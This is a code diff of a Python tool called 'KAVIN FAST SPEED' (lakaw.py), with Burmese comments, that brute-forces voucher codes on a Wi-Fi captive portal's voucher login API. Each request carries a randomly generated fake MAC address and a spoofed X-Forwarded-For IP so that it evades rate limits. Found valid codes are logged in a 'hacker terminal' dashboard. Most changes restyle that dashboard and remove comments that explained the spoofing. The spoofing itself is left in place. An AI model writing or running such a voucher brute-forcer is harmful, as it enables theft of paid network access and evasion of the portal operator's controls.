@@ -1,5 +1,5 @@
 # =====================================================================
-# lakaw.py (KAVIN FAST SPEED - MAC Spoofing Edition)
+# lakaw.py (KAVIN FAST SPEED - Modern Hacker Terminal UI)
 # =====================================================================
 
 import os
@@ -39,7 +39,6 @@ SESSION_REFRESH_SLEEP = 3.0
 
 console = Console()
 session = requests.Session()
-# ★ ဖုန်းရဲ့ တကယ့် MAC Address ကို မသုံးတော့ဘဲ အတုတွေ ပြောင်းသုံးမည်
 session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36"})
 adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=3)
 session.mount('http://', adapter)
@@ -47,9 +46,7 @@ session.mount('https://', adapter)
 
 db_lock = threading.Lock()
 
-# ★ MAC Address အတု ဖန်တီးတဲ့ Function
 def generate_random_mac():
-    # ပထမ Octet ကို 0 ဒါမှမဟုတ် 2 ပဲ ဖြစ်ရမည် (Multicast/Broadcast မဖြစ်စေရန်)
     first_octet = random.choice([0x00, 0x02, 0x04, 0x06, 0x0A, 0x0E])
     mac = [first_octet] + [random.randint(0x00, 0xff) for _ in range(5)]
     return ':'.join(map(lambda x: "%02x" % x, mac)).upper()
@@ -129,7 +126,6 @@ def extract_session(value):
     except Exception: pass
     return None
 
-# ★ NT ngaton.py စနစ်အတိုင်း Session ရှာခြင်း (MAC Spoofing ပါဝင်သည်)
 def fetch_session(custom_url=""):
     if custom_url:
         try:
@@ -149,13 +145,12 @@ def fetch_session(custom_url=""):
     
     for url in probes:
         try:
-            # ★ MAC Address အတုကို Header ထဲမှာ ထည့်ပို့မည်
             fake_mac = generate_random_mac()
             headers = {
                 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                "Client-Mac": fake_mac, # ★ MAC အတု
-                "X-Forwarded-For": f"192.168.110.{random.randint(2, 254)}" # ★ IP အတု
+                "Client-Mac": fake_mac,
+                "X-Forwarded-For": f"192.168.110.{random.randint(2, 254)}"
             }
             r = session.get(url, timeout=5, allow_redirects=True, verify=False, headers=headers)
         except Exception:
@@ -192,7 +187,6 @@ def fetch_session(custom_url=""):
 
 def test_code(portal_base, session_id, code):
     url = f"{portal_base}/api/auth/voucher/?lang=en_US"
-    # ★ ကုဒ်ပို့တဲ့အခါမှာလည်း MAC အတုနဲ့ IP အတုကို ထည့်ပို့မည်
     fake_mac = generate_random_mac()
     headers = {
         "Content-Type": "application/json", 
@@ -227,62 +221,63 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 
+# ★ Modern Hacker Terminal UI
 def get_dashboard_renderable(mode, current_code, tested, elapsed, status, hits, logs, speed, is_manual):
-    status_color = "bright_green" if status == "Active" else ("bright_red" if status == "Limit" else "bright_yellow")
+    # အရောင် သတ်မှတ်ခြင်း
+    status_color = "bright_green" if status == "Active" else ("bright_red" if status == "Limit" else "yellow")
     mode_display = "MANUAL" if is_manual else "AUTO"
-
+    
+    # မျက်နှာပြင် အလှဆင်ခြင်း
     dash = Text()
-    dash.append("▀▄▀▄ ", style="bold bright_magenta")
-    dash.append("KAVIN FAST SPEED", style="bold bright_cyan")
-    dash.append(" ▄▀▄▀\n", style="bold bright_magenta")
-    dash.append("──────────────────────────────────────\n", style="dim bright_cyan")
+    dash.append("  ╔══════════════════════════════════════════╗\n", style="bold cyan")
+    dash.append("  ║      ⚡ K A V I N   F A S T   S P E E D     ║\n", style="bold bright_magenta")
+    dash.append("  ╚══════════════════════════════════════════╝\n", style="bold cyan")
+    dash.append("\n")
     
-    dash.append("  ⚡ SPEED  : ", style="bright_white")
-    dash.append(f"{speed:.1f} c/m\n", style="bold bright_yellow")
-    
-    dash.append("  🎯 CURRENT: ", style="bright_white")
+    # အချက်အလက်များ
+    dash.append(f"  ▸ {str('CODE').ljust(10)}: ", style="bold white")
     dash.append(f"{current_code}\n", style="bold bright_green")
     
-    dash.append("  🏹 TRIED  : ", style="bright_white")
-    dash.append(f"{tested:,}\n", style="bold bright_cyan")
+    dash.append(f"  ▸ {str('TRIED').ljust(10)}: ", style="bold white")
+    dash.append(f"{tested:,}\n", style="bold yellow")
     
-    dash.append("  ⏱ TIME   : ", style="bright_white")
-    dash.append(f"{elapsed}\n", style="bold bright_blue")
+    dash.append(f"  ▸ {str('SPEED').ljust(10)}: ", style="bold white")
+    dash.append(f"{speed:.1f} c/m\n", style="bold cyan")
     
-    dash.append("  📡 STATUS : ", style="bright_white")
+    dash.append(f"  ▸ {str('STATUS').ljust(10)}: ", style="bold white")
     dash.append(f"{status.upper()}\n", style=f"bold {status_color}")
     
-    dash.append("  🏆 HITS   : ", style="bright_white")
-    dash.append(f"{len(hits)}\n", style="bold bright_magenta")
+    dash.append(f"  ▸ {str('TIME').ljust(10)}: ", style="bold white")
+    dash.append(f"{elapsed}\n", style="bold blue")
     
-    dash.append("  📌 METHOD : ", style="bright_white")
-    dash.append(f"{mode_display}\n", style="bold bright_yellow")
+    dash.append(f"  ▸ {str('HITS').ljust(10)}: ", style="bold white")
+    dash.append(f"{len(hits)}\n", style="bold magenta")
     
-    dash.append("──────────────────────────────────────\n", style="dim bright_cyan")
-    dash.append("  📜 RECENT LOGS\n", style="bold bright_blue")
-    dash.append("──────────────────────────────────────\n", style="dim bright_cyan")
+    dash.append(f"  ▸ {str('METHOD').ljust(10)}: ", style="bold white")
+    dash.append(f"{mode_display}\n", style="bold yellow")
     
+    dash.append("\n")
+    dash.append("  ─── [ 📜 TERMINAL LOGS ] ─────────────────────\n", style="dim cyan")
     if logs:
         for lg in logs[-3:]:
             dash.append(f"  {lg}\n")
     else:
-        dash.append("  Waiting for data...\n", style="dim")
+        dash.append("  > Waiting for incoming data...\n", style="dim")
         
-    dash.append("──────────────────────────────────────\n", style="dim bright_cyan")
-    dash.append("  💎 VALID CODES VAULT\n", style="bold bright_yellow")
-    dash.append("──────────────────────────────────────\n", style="dim bright_cyan")
-    
+    dash.append("\n")
+    dash.append("  ─── [ 💎 FOUND CODES ] ───────────────────────\n", style="dim yellow")
     last_hits = hits[-3:]
     if last_hits:
         for i, h in enumerate(last_hits, 1):
             c = h.get("code", "") if isinstance(h, dict) else h
             t = h.get("time", "--:--:--") if isinstance(h, dict) else "--:--:--"
-            dash.append(f"  {i}. ", style="dim white")
+            dash.append(f"  [{i}] ", style="dim white")
             dash.append(f"{c}", style="bold bright_green")
-            dash.append(f"   [{t}]\n", style="dim bright_cyan")
+            dash.append(f" @ {t}\n", style="dim cyan")
     else:
-        dash.append("  Searching...\n", style="dim")
+        dash.append("  > Searching the database...\n", style="dim")
         
+    dash.append("\n  ══════════════════════════════════════════════\n", style="dim cyan")
     return dash
 def scan_loop(mode, length, portal_base=None, session_id=None, is_manual=False, scan_method="random", start_tested=0, start_hits=None):
     global seq_counter
@@ -320,7 +315,7 @@ def scan_loop(mode, length, portal_base=None, session_id=None, is_manual=False, 
                             return
                         else:
                             current_status[0] = "Init"
-                            push_log("[yellow]Session ရှာနေပါသည် (MAC Spoof)...[/yellow]")
+                            push_log("[yellow]Session ရှာနေပါသည်...[/yellow]")
                             current_portal, current_session = fetch_session()
                             
                             if not current_session:
